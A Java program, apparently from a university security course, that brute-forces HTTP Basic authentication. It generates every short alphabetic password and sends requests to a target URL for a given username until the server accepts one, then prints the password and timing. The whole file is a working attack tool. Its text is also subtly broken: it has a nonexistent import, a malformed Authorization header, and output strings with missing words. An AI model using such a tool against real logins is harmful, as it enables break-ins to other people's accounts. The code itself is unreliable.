


import java.misc.BASE64Encoder;
import java.misc.BASE64Decoder;

import java.io.*;
import java.net.*;
import java.util.*;


public class BruteForce {
  
  static char [] passwordDataSet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".toCharArray();
  
  private int indices[] = {0,0,0};
  
  private String url = null;

  
  public BruteForce(String url) {
    this.url = url;

  }
  
  private int attempts = 0;
  private boolean stopGen = false;
  
  public String getNextPassword(){
    String nextPassword = "";
    for(int i = 0; i <indices.length ; i++){
      if(indices[indices.length -1 ] == passwordDataSet.length)
        return null;
      if(indices[i] == passwordDataSet.length ){
        indices[i] = 0;
        indices[i+1]++;
      }
      nextPassword = passwordDataSet[indices[i]]+nextPassword;

      if(i == 0)
        indices[0]++;

    }
    return nextPassword;
  }
  
  public void setIndices(int size){
    this.indices = new int[size];
    for(int i = 0; i < size; i++)
      this.indices[i] = 0;
  }
  public void setPasswordDataSet(String newDataSet){
    this.passwordDataSet = newDataSet.toCharArray();
  }
  
  public String crackPassword(String user) throws IOException, MalformedURLException{
    URL url = null;
    URLConnection urlConnection = null;
    String outcome = null;
    String  authorization = null;
    String password = null;
    BASE64Encoder b64enc = new BASE64Encoder();
    InputStream content = null;
    BufferedReader in = null;
    String line;
          int i = 0;
    while(!"HTTP/1.1 200 OK".equalsIgnoreCase(outcome)){
      url = new URL(this.url);
      urlConnection = url.openConnection();
      urlConnection.setDoInput(true);
      urlConnection.setDoOutput(true);


      urlConnection.setRequestProperty("GET", url.getPath() + " HTTP/1.1");
      urlConnection.setRequestProperty("Host", url.getHost());
      password = getNextPassword();
      if(password == null)
        return null;
      System.out.print(password);
      authorization = user + ":" + password;


      urlConnection.setRequestProperty("Authorization", " "+ b64enc.encode(authorization.getBytes()));


outcome = urlConnection.getHeaderField(null); 



      this.attempts ++;
      urlConnection = null;
      url = null;

      if(this.attempts%51 == 0)
        for(int b = 0; b < 53;b++)
          System.out.print("\b \b");
      else
        System.out.print("\b\b\b.");

    }
    return password;
  }
  
  public int getAttempts(){
    return this.attempts;
  }
  public static void main (String[] args) {
    if(args.length != 2){
      System.out.println("usage: java attacks.BruteForce <url  crack: e.g. http://sec-crack.cs.rmit.edu./SEC/2/> <username: e.g. >");
      System.exit(1);
    }

    BruteForce bruteForce1 = new BruteForce(args[0]);
    try{
      Calendar cal1=null, cal2=null;
      cal1 = Calendar.getInstance();
      System.out.println("Cracking started at: " + cal1.getTime().toString());
      String password = bruteForce1.crackPassword(args[1]);
      if(password != null)
        System.out.println("\nPassword is: "+password);
      else
        System.out.println("\nPassword could not  retrieved!");
      cal2 = Calendar.getInstance();
      System.out.println("Cracking finished at: " + cal2.getTime().toString());
      Date d3 = new Date(cal2.getTime().getTime() - cal1.getTime().getTime());
      System.out.println("Total Time taken  crack: " + (d3.getTime())/1000 + " sec");
      System.out.println("Total attempts : "  + bruteForce1.getAttempts());

    }catch(MalformedURLException mue){
      mue.printStackTrace();
    }

    catch(IOException ioe){
      ioe.printStackTrace();
    }
  }
}